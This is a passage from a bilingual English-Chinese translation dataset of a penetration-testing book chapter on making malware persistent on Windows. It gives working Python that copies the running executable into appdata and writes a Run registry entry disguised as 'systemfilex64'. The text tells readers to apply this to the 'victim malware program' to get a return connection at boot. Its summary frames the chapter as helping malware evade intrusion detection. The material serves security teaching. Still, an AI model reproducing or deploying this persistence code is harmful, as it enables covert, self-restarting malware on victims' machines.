- en: '# "Software\Microsoft\Windows\CurrentVersion\Run"'
  id: totrans-108
  prefs: []
  type: TYPE_NORMAL
  zh: '# "Software\Microsoft\Windows\CurrentVersion\Run"'
- en: key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
  zh: key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
- en: key_obj = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
  zh: key_obj = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)
- en: winreg.SetValueEx(key_obj, "systemfilex64", 0, winreg.REG_SZ, to_save_file)
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
  zh: winreg.SetValueEx(key_obj, "systemfilex64", 0, winreg.REG_SZ, to_save_file)
- en: winreg.CloseKey(key_obj)
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
  zh: winreg.CloseKey(key_obj)
- en: This code simply adds the **to_save_file** string, which contains the executable
    name to the start up registry.
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: 这段代码简单地将**to_save_file**字符串添加到启动注册表中，该字符串包含可执行文件的名称。
- en: 'To make changes to the program, you need to run this executable in administrator
    mode, so you can copy the code from the previous section and add it to the start
    of this script. The complete code is linked here:'
  id: totrans-114
  prefs: []
  type: TYPE_NORMAL
  zh: 要对程序进行修改，你需要以管理员模式运行此可执行文件，因此你可以将前一节中的代码复制并将其添加到此脚本的开头。完整的代码链接如下：
- en: 'if not os.path.exists(to_save_file):'
  id: totrans-115
  prefs: []
  type: TYPE_NORMAL
  zh: 'if not os.path.exists(to_save_file):'
- en: print("Becoming Persistent")
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
  zh: print("正在变得持久化")
- en: shutil.copyfile(curr_executable, to_save_file)
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
  zh: shutil.copyfile(curr_executable, to_save_file)
- en: key = winreg.HKEY_CURRENT_USER
  id: totrans-118
  prefs: []
  type: TYPE_NORMAL
  zh: key = winreg.HKEY_CURRENT_USER
- en: '# "Software\Microsoft\Windows\CurrentVersion\Run"'
  id: totrans-119
  prefs: []
  type: TYPE_NORMAL
  zh: '# "Software\Microsoft\Windows\CurrentVersion\Run"'
- en: key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
  zh: key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
- en: key_obj = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
  zh: key_obj = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)
- en: winreg.SetValueEx(key_obj, "systemfilex64", 0, winreg.REG_SZ, to_save_file)
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: winreg.SetValueEx(key_obj, "systemfilex64", 0, winreg.REG_SZ, to_save_file)
- en: winreg.CloseKey(key_obj)
  id: totrans-123
  prefs: []
  type: TYPE_NORMAL
  zh: winreg.CloseKey(key_obj)
- en: 'else:'
  id: totrans-124
  prefs: []
  type: TYPE_NORMAL
  zh: 否则：
- en: print("path doesnt exist")
  id: totrans-125
  prefs: []
  type: TYPE_NORMAL
  zh: print("路径不存在")
- en: 'After running the code, if you go to the **appdata** folder, you will see the
    following executable:'
  id: totrans-126
  prefs: []
  type: TYPE_NORMAL
  zh: 运行代码后，如果你进入**appdata**文件夹，你将看到以下可执行文件：
- en: '![Figure 9.8 – Current executable copied to the appdata folder'
  id: totrans-127
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 9.8 – 当前可执行文件已复制到 appdata 文件夹'
- en: '](image/B14788_09_08.jpg)'
  id: totrans-128
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_09_08.jpg)'
- en: Figure 9.8 – Current executable copied to the appdata folder
  id: totrans-129
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.8 – 当前可执行文件已复制到 appdata 文件夹
- en: 'Also, to verify whether the Windows registry has been modified, open the registry
    editor by searching for **regedit** in a Windows search. Open it and go to the
    following path:'
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: 同样，为了验证 Windows 注册表是否已被修改，可以通过在 Windows 搜索中搜索**regedit**打开注册表编辑器。打开后，前往以下路径：
- en: '**"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"**:'
  id: totrans-131
  prefs: []
  type: TYPE_NORMAL
  zh: '**"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"**：'
- en: '![Figure 9.9 – Edited registry'
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 9.9 – 编辑后的注册表'
- en: '](image/B14788_09_09.jpg)'
  id: totrans-133
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_09_09.jpg)'
- en: Figure 9.9 – Edited registry
  id: totrans-134
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.9 – 编辑后的注册表
- en: The final row is the entry we just added. You can see that the **Data** field
    in the preceding screenshot links to the executable we just copied. Now, if you
    restart the PC, you will see that once the system boots up, the aforementioned
    executable will be started automatically. By way of practice, try to replicate
    the same procedure with the victim malware program. You should be able to get
    a return connection from the victim's machine when the victim boots up their computer.
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
  zh: 最后一行是我们刚刚添加的条目。你可以看到前面截图中的**数据**字段链接到我们刚刚复制的可执行文件。现在，如果你重新启动计算机，你会发现系统启动后，上述的可执行文件会自动启动。作为练习，尝试用受害者恶意软件程序复制相同的步骤。当受害者启动他们的计算机时，你应该能够从受害者的机器上获得一个返回连接。
- en: Summary
  id: totrans-136
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 总结
- en: In this chapter, we learned different system protection techniques. We started
    by getting an understanding of system protection and how different IDSes/IPSes
    work. We learned about different types of detection mechanisms. We also learned
    about using executables with elevated privileges. Finally, we learned how to make
    our executables persistent. This knowledge, combined with things you learned in
    previous chapters, will allow you to develop your malware tools without being
    easily detected. As long as you keep the impact of your malware on the system
    low, it would not be easy for an IDS to detect your malware. I hope you learned
    a lot and enjoyed this book! Remember that cybersecurity is an everchanging field
    and you need to be constantly up to date with modern tools in order to become
    a successful penetration tester.
  id: totrans-137
  prefs: []
  type: TYPE_NORMAL
  zh: 在这一章中，我们学习了不同的系统保护技术。我们首先了解了系统保护以及不同的入侵检测系统（IDS）/入侵防御系统（IPS）的工作原理。我们学习了不同类型的检测机制。我们还学习了如何使用具有提升权限的可执行文件。最后，我们学习了如何使我们的可执行文件持久化。这些知识，结合你在之前章节学到的内容，将使你能够开发出不易被检测的恶意软件工具。只要你保持恶意软件对系统的影响较低，IDS就不容易检测到你的恶意软件。希望你学到了很多并且喜欢这本书！请记住，网络安全是一个不断变化的领域，你需要时刻与现代工具保持同步，才能成为一名成功的渗透测试人员。
